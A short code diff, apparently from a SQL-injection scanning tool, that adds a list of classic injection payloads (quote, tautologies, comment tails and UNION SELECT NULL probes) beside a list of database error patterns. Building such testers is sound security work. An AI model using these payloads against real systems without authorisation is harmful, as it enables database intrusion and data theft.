@@ -9,3 +9,13 @@ SQL_ERROR_PATTERNS = [
     "unclosed quotation mark after the character string",
     "ORA-"
 ]
+SQLI_PAYLOADS = [
+    "'",                    # simple single quote
+    "' OR '1'='1",          # classic tautology
+    "\" OR \"1\"=\"1",      # double-quote form
+    "' OR 1=1 -- ",         # comment tail
+    "1' OR '1'='1' -- ",    # alternative
+    "' UNION SELECT NULL-- ",  # simple UNION (may need more columns)
+    "' UNION SELECT NULL,NULL-- ",
+    "' UNION SELECT NULL,NULL,NULL-- "
+]
